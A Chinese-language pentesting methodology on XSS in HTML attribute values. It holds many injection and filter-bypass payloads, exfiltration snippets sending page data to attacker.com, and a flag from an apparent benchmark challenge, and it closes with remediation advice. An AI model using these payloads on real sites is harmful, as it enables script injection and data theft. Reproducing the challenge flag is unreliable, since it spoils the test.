# XSS HTML 属性上下文注入方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 XSS HTML 属性上下文注入检测与利用流程，帮助发现和利用 HTML 属性值未正确编码导致的跨站脚本漏洞。

## 1.2 适用范围

本文档适用于所有将用户输入反射到 HTML 属性上下文的 Web 应用，包括 value、src、href、alt 等属性。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

XSS HTML 属性上下文注入是指用户输入被反射到 HTML 标签的属性值中，由于未进行适当的编码或过滤，攻击者可以逃逸属性上下文并注入恶意事件处理器或标签。

**本质问题**：用户输入未经适当编码就被输出到 HTML 属性中，违背了"数据与代码分离"的原则。

### 属性上下文类型

| 上下文类型 | 示例 | 风险等级 |
|-----------|------|---------|
| 双引号属性 | `<input value="USER_INPUT">` | 高 |
| 单引号属性 | `<input value='USER_INPUT'>` | 高 |
| 无引号属性 | `<input value=USER_INPUT>` | 中 |
| 事件处理器 | `<div onclick="USER_INPUT">` | 极高 |
| URL 属性 | `<a href="USER_INPUT">` | 中 |
| CSS 属性 | `<div style="USER_INPUT">` | 中 |

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-79 | XSS |
| CWE-116 | HTML 编码不足 |
| CWE-80 | 基本的 XSS 保护不足 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 搜索功能 | 搜索框 value 属性 | 搜索词反射到 value |
| 表单回显 | 表单字段预填充 | 用户输入回显到 value |
| 图片展示 | img src 属性 | 图片 URL 用户可控 |
| 链接生成 | a href 属性 | 链接 URL 用户可控 |
| 个性化设置 | 主题/样式自定义 | CSS 样式用户可控 |
| 用户资料 | 头像/主页 URL | 资料数据反射到属性 |
| 错误页面 | 错误信息反射 | 错误消息反射到属性 |

### XBEN-019-24 案例分析

**场景描述**：Flask 应用登录表单的 HTML 属性上下文存在潜在 XSS 风险。

**漏洞代码**：
```html
<!-- File: login.html -->
<input type="text" name="username" id="username" 
       class="form-control" placeholder="Username" required>
```

**如果应用回显用户输入**：
```python
# ❌ 危险代码
@app.route('/login', methods=['GET'])
def login():
    username = request.args.get('username', '')
    return render_template('login.html', username=username)
```

```html
<!-- ❌ 危险的模板 -->
<input type="text" name="username" 
       value="{{ username }}"  <!-- 用户输入直接输出 -->
       class="form-control">
```

## 2.3 漏洞探测方法

### 2.3.1 输入点识别

**步骤 1：识别属性反射点**

```bash
# 测试搜索框 value 属性
curl "http://target.com/search?q=test" | grep -o 'value="[^"]*"'

# 如果输出：value="test"
# 说明存在属性反射

# 测试表单回显
curl -X POST "http://target.com/login" \
  -d "username=testuser" | grep -o 'value="[^"]*"'
```

**步骤 2：上下文分析**

```bash
# 发送探测 Payload
curl "http://target.com/search?q=\"test\""

# 观察输出位置
# <input value=""test"">  # 双引号未编码 - 可注入
# <input value="&quot;test&quot;">  # 正确编码 - 安全
# <input value="test">  # 引号被移除 - 需进一步测试
```

### 2.3.2 黑盒测试

**双引号属性上下文测试**：

```html
<!-- 测试 Payload -->
" onmouseover="alert(1)"
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
" /><script>alert(1)</script>

<!-- 发送请求 -->
curl "http://target.com/search?q=%22%20onmouseover=%22alert(1)%22"

<!-- 观察响应 -->
<!-- 如果输出：value="" onmouseover="alert(1)""> -->
<!-- 存在 XSS 漏洞 -->
```

**单引号属性上下文测试**：

```html
<!-- 测试 Payload -->
' onmouseover='alert(1)'
' autofocus onfocus='alert(1)
'><script>alert(1)</script>
' /><script>alert(1)</script>

<!-- 发送请求 -->
curl "http://target.com/search?q='%20onmouseover='alert(1)'"
```

**无引号属性上下文测试**：

```html
<!-- 测试 Payload -->
 onmouseover=alert(1)
 autofocus onfocus=alert(1)
><script>alert(1)</script>

<!-- 发送请求 -->
curl "http://target.com/search?q=%20onmouseover=alert(1)"

<!-- 观察响应 -->
<!-- 如果输出：value= onmouseover=alert(1) -->
<!-- 存在 XSS 漏洞 -->
```

### 2.3.3 白盒测试

**代码审计要点**：

```python
# ❌ 危险代码示例

# Flask 模板直接输出
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template('search.html', query=query)

<!-- search.html -->
<input type="text" name="q" value="{{ query }}">
<!-- 如果 query 包含 " onmouseover="alert(1)" -->
<!-- 输出：<input value="" onmouseover="alert(1)"> -->

# ✅ 安全代码示例

<!-- 方法 1：使用 autoescape（Jinja2 默认启用） -->
<input type="text" name="q" value="{{ query }}">
<!-- Jinja2 会自动编码双引号 -->
<!-- 输出：<input value="&quot;test&quot;"> -->

<!-- 方法 2：手动编码 -->
<input type="text" name="q" value="{{ query | e }}">

<!-- 方法 3：使用 JavaScript 变量 -->
<script>
    var query = "{{ query | tojson }}";  // JSON 编码
</script>
```

**危险函数列表**：

| 语言/框架 | 危险操作 | 安全替代 |
|----------|---------|---------|
| Jinja2 | `{{ var | safe }}` | `{{ var }}` 或 `{{ var | e }}` |
| Django | `{{ var | safe }}` | `{{ var }}` |
| PHP | `echo $var` | `echo htmlspecialchars($var)` |
| Java | `out.print(var)` | `out.print(escapeHtml(var))` |
| Node.js | `res.send(var)` | `res.send(escape(var))` |

## 2.4 漏洞利用方法

### 2.4.1 双引号属性逃逸

**场景**：`<input value="USER_INPUT">`

**利用 Payload**：

```html
<!-- Payload 1：事件处理器注入 -->
" onmouseover="alert(1)"
<!-- 输出：<input value="" onmouseover="alert(1)"> -->

<!-- Payload 2：autofocus 自动触发 -->
" autofocus onfocus="alert(1)
<!-- 输出：<input value="" autofocus onfocus="alert(1)"> -->
<!-- 页面加载时自动执行 -->

<!-- Payload 3：标签闭合 -->
"><script>alert(1)</script>
<!-- 输出：<input value=""><script>alert(1)</script>"> -->

<!-- Payload 4：完整 HTML 重写 -->
></html><body><input onfocus=alert(1) autofocus>
<!-- 输出：<input value="></html><body><input onfocus=alert(1) autofocus>"> -->
<!-- 浏览器解析时会执行 -->
```

**XBEN-019-24 利用示例**：

```bash
# 如果登录表单回显用户名
curl "http://localhost:41943/login?username=%22%20autofocus%20onfocus=%22alert(document.domain)%22"

# 观察响应
# <input type="text" name="username" 
#        value="" autofocus onfocus="alert(document.domain)"
#        class="form-control">

# 当用户访问页面时，XSS 自动触发
```

### 2.4.2 单引号属性逃逸

**场景**：`<input value='USER_INPUT'>`

**利用 Payload**：

```html
<!-- Payload 1：事件处理器注入 -->
' onmouseover='alert(1)'
<!-- 输出：<input value='' onmouseover='alert(1)'> -->

<!-- Payload 2：使用双引号绕过 -->
" onmouseover="alert(1)"
<!-- 如果只过滤单引号，双引号可绕过 -->
<!-- 输出：<input value='" onmouseover="alert(1)"'> -->

<!-- Payload 3：反引号绕过 -->
` onmouseover=`alert(1)`
<!-- 输出：<input value='` onmouseover=`alert(1)`'> -->
```

### 2.4.3 无引号属性逃逸

**场景**：`<input value=USER_INPUT>`

**利用 Payload**：

```html
<!-- Payload 1：空格分隔 -->
 onmouseover=alert(1)
<!-- 输出：<input value= onmouseover=alert(1)> -->

<!-- Payload 2：Tab/换行分隔 -->
%09onmouseover=alert(1)
%0Aonmouseover=alert(1)

<!-- Payload 3：斜杠分隔 -->
/onmouseover=alert(1)
```

### 2.4.4 事件处理器注入

**常见事件处理器**：

```html
<!-- 鼠标事件 -->
onmouseover="alert(1)"
onmouseenter="alert(1)"
onmousedown="alert(1)"
onmouseup="alert(1)"
onclick="alert(1)"

<!-- 焦点事件 -->
onfocus="alert(1)"
onblur="alert(1)"
onfocusin="alert(1)"
onfocusout="alert(1)"

<!-- 键盘事件 -->
onkeydown="alert(1)"
onkeyup="alert(1)"
onkeypress="alert(1)"

<!-- 表单事件 -->
onchange="alert(1)"
oninput="alert(1)"
onsubmit="alert(1)"
onreset="alert(1)"

<!-- 加载事件 -->
onload="alert(1)"
onerror="alert(1)"
onunload="alert(1)"

<!-- 动画事件 -->
onanimationstart="alert(1)"
onanimationend="alert(1)"
ontransitionend="alert(1)"
```

**自动触发组合**：

```html
<!-- autofocus + onfocus -->
<input autofocus onfocus=alert(1)>
<!-- 页面加载时自动获得焦点并触发 -->

<!-- marquee + onstart -->
<marquee onstart=alert(1)>
<!-- 页面加载时自动触发 -->

<!-- details + ontoggle -->
<details open ontoggle=alert(1)>
<!-- 展开时触发 -->

<!-- video/audio + onerror -->
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<!-- 加载失败时触发 -->
```

### 2.4.5 敏感数据窃取

**场景**：结合认证绕过和属性上下文 XSS

**XBEN-019-24 完整利用链**：

```bash
# 步骤 1：识别敏感数据位置
# 假设 Flag 显示在 <h5> 标签中
# <h5>flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}</h5>

# 步骤 2：构造 XSS Payload
PAYLOAD='" autofocus onfocus="fetch(window.location).then(r=>r.text()).then(html=>{const d=new DOMParser().parseFromString(html,\"text/html\");const flag=d.querySelector(\"h5\").textContent;fetch(\"http://attacker.com/exfil?data=\"+encodeURIComponent(flag));})'

# 步骤 3：提交 Payload
curl -X POST "http://localhost:41943/challenge" \
  -d "solution=$PAYLOAD"

# 步骤 4：如果应用使用 PhantomJS 验证
# XSS 会在 PhantomJS 中执行，Flag 被外带
```

**浏览器端利用脚本**：

```javascript
// 完整 HTML 属性逃逸 + 数据窃取
" autofocus onfocus="
  fetch('/dashboard', {
    headers: {'X-UserId': '10052'}
  })
  .then(r => r.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const flag = doc.querySelector('h5').textContent;
    fetch('http://attacker.com/exfil?data=' + encodeURIComponent(flag));
  })
"
```

### 2.4.6 结合其他漏洞

**组合攻击 1：属性 XSS + 认证绕过**

```bash
# 如果 X-UserId 头部同时存在认证绕过和 XSS
curl -b cookies.txt http://target.com/dashboard \
  -H "X-UserId: \" onmouseover=\"alert(1)\""

# 响应中反射头部值
# <input value="" onmouseover="alert(1)">
# XSS 触发
```

**组合攻击 2：属性 XSS + 路径遍历**

```bash
# 如果文件名参数同时存在路径遍历和 XSS
curl "http://target.com/resource?filename=\" onerror=\"alert(1)\""

# 如果响应 Content-Type 是 text/html
# 可能触发 XSS
```

## 2.5 漏洞利用绕过方法

### 2.5.1 引号过滤绕过

**场景**：应用过滤双引号或单引号

**绕过方法 1：使用反引号**

```html
<!-- 如果过滤双引号和单引号 -->
` onmouseover=`alert(1)`
<!-- 反引号在 ES6 中是有效的字符串定界符 -->
```

**绕过方法 2：使用无引号语法**

```html
<!-- 如果过滤所有引号 -->
onmouseover=alert(1)
<!-- HTML5 允许无引号属性值（如果不含空格） -->
```

**绕过方法 3：使用 HTML 实体编码**

```html
<!-- 双引号编码 -->
&quot; onmouseover=&quot;alert(1)&quot;
&#34; onmouseover=&#34;alert(1)&#34;

<!-- 单引号编码 -->
&apos; onmouseover=&apos;alert(1)&apos;
&#39; onmouseover=&#39;alert(1)&#39;
```

### 2.5.2 空格过滤绕过

**场景**：应用过滤空格字符

**绕过方法 1：使用 Tab/换行**

```html
<!-- Tab 字符 -->
"	onmouseover="alert(1)"
<!-- %09 编码 -->
%09onmouseover=%09alert(1)

<!-- 换行符 -->
"
onmouseover="alert(1)
<!-- %0A 编码 -->
%0Aonmouseover=%0Aalert(1)
```

**绕过方法 2：使用斜杠**

```html
<!-- 斜杠分隔 -->
"/onmouseover="alert(1)
```

**绕过方法 3：使用注释**

```html
<!-- 注释分隔 -->
"<!--comment-->onmouseover<!--comment-->=<!--comment-->"alert(1)"
```

### 2.5.3 事件处理器过滤绕过

**场景**：应用过滤常见事件处理器（onmouseover、onclick 等）

**绕过方法 1：使用罕见事件处理器**

```html
<!-- 常见被过滤的事件处理器 -->
onmouseover, onclick, onerror, onload

<!-- 罕见可绕过的事件处理器 -->
onanimationstart=alert(1)
onanimationend=alert(1)
ontransitionend=alert(1)
onpointerover=alert(1)
ongotpointercapture=alert(1)
oncanplay=alert(1)
ondurationchange=alert(1)
```

**绕过方法 2：大小写混合**

```html
<!-- 如果正则只匹配小写 -->
ONMOUSEOVER=alert(1)
OnMouseOver=alert(1)
oN mOuSeOvEr=alert(1)
```

**绕过方法 3：使用注释分割**

```html
<!-- 如果过滤 onmouseover -->
on<!--comment-->mouseover=alert(1)
on/**/mouseover=alert(1)
```

### 2.5.4 标签过滤绕过

**场景**：应用过滤特定标签（如 `<script>`、`<svg>`）

**绕过方法 1：使用未过滤标签**

```html
<!-- 如果只过滤 script 和 svg -->
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<math><maction actiontype="statusline#http://google.com" 
         xlink:href="javascript:alert(1)">click</maction></math>
```

**绕过方法 2：使用 CSS 表达式（旧 WebKit/PhantomJS）**

```html
<!-- CSS expression() 注入 -->
<div style="background:url(javascript:alert(1))">
<div style="width:expression(alert(1))">

<!-- CSS url()+javascript: 协议 -->
<style>
body { background:url('javascript:alert(1)'); }
</style>

<!-- CSS @import javascript: -->
<style>
@import 'javascript:alert(1)';
</style>
```

**绕过方法 3：自闭合标签语法**

```html
<!-- 如果过滤 <style 但允许 <style/ -->
<style/onload=alert(1)>

<!-- 如果过滤 <svg 但允许 <svg/ -->
<svg/onload=alert(1)>
```

### 2.5.5 弱正则过滤绕过

**场景**：应用使用弱正则表达式过滤

**典型弱正则**：
```python
# 只过滤 <[a-z/] 和 "XSS"
re.sub(r'<[a-z/]+', '', input)
re.sub(r'"XSS"', '', input)
```

**绕过方法 1：使用大写字母**

```html
<!-- 正则只匹配小写 [a-z] -->
<SCRIPT>alert(1)</SCRIPT>
<SVG onload=alert(1)>
```

**绕过方法 2：使用未过滤标签**

```html
<!-- 如果正则只过滤 <[a-yA-Y/] -->
<z onload=alert(1)>
<!-- z 不在 a-y 范围内，可绕过 -->
```

**绕过方法 3：使用属性注入而非标签**

```html
<!-- 如果只过滤标签，不过滤属性 -->
" onfocus="alert(1)" autofocus="
<!-- 输出到 value 属性中 -->
<!-- <input value="" onfocus="alert(1)" autofocus=""> -->
```

### 2.5.6 PhantomJS 验证机制绕过

**场景**：应用使用 PhantomJS 等 headless 浏览器验证 XSS

**利用方法 1：autofocus 自动触发**

```html
<!-- PhantomJS 加载页面时自动触发 -->
<input autofocus onfocus=alert(document.domain)>
<body onload=alert(1)>
<svg onload=alert(1)>
```

**利用方法 2：完整 HTML 闭合绕过 CSS 错误**

```html
<!-- 如果 PhantomJS 报告 CSS 错误 -->
<!-- 使用完整 HTML 闭合 -->
></html><body><input autofocus onfocus=alert("XSS")>
```

**利用方法 3：拦截 alert/confirm/prompt**

```javascript
// 如果 PhantomJS 拦截 alert
// 使用其他方法 exfiltrate

// 方法 1：fetch 外带
fetch('http://attacker.com/exfil?data=' + document.domain)

// 方法 2：Image 外带
new Image().src = 'http://attacker.com/exfil?data=' + document.domain

// 方法 3：XMLHttpRequest 外带
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/exfil?data=' + document.domain);
xhr.send();
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload | 适用场景 |
|-----|---------|---------|
| 双引号逃逸 | `" onmouseover="alert(1)` | `value="INPUT"` |
| 单引号逃逸 | `' onmouseover='alert(1)` | `value='INPUT'` |
| 无引号逃逸 | ` onmouseover=alert(1)` | `value=INPUT` |
| autofocus | `" autofocus onfocus="alert(1)` | 自动触发 |
| 标签闭合 | `"><script>alert(1)</script>` | 任意上下文 |
| 反引号 | `` ` onmouseover=`alert(1)` `` | 引号过滤 |
| HTML 实体 | `&quot; onmouseover=&quot;alert(1)` | 编码绕过 |
| Tab 绕过 | `%09onmouseover=%09alert(1)` | 空格过滤 |

## 3.2 自动化工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| XSStrike | 高级 XSS 检测 | https://github.com/s0md3v/XSStrike |
| Dalfox | XSS 参数分析 | https://github.com/hahwul/dalfox |
| Burp Suite | 手动测试 | https://portswigger.net/burp |
| DOM Invader | DOM XSS 检测 | https://portswigger.net/burp |

## 3.3 修复建议

**输出编码**：
1. HTML 属性上下文使用 HTML 实体编码
2. 双引号 → `&quot;`
3. 单引号 → `&#x27;` 或 `&apos;`
4. `<` → `&lt;`
5. `>` → `&gt;`
6. `&` → `&amp;`

**框架安全实践**：
1. 使用 Jinja2/Django 等现代框架的自动编码
2. 避免使用 `| safe` 或 `| raw` 过滤器
3. 使用 `tojson` 过滤器输出 JavaScript 变量

**输入验证**：
1. 白名单验证允许的字符
2. 移除或编码危险字符
3. 验证输入长度

---

**参考资源**：
- [OWASP Cheat Sheet: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [HTML5 Attribute Syntax](https://html.spec.whatwg.org/multipage/syntax.html#attributes-2)
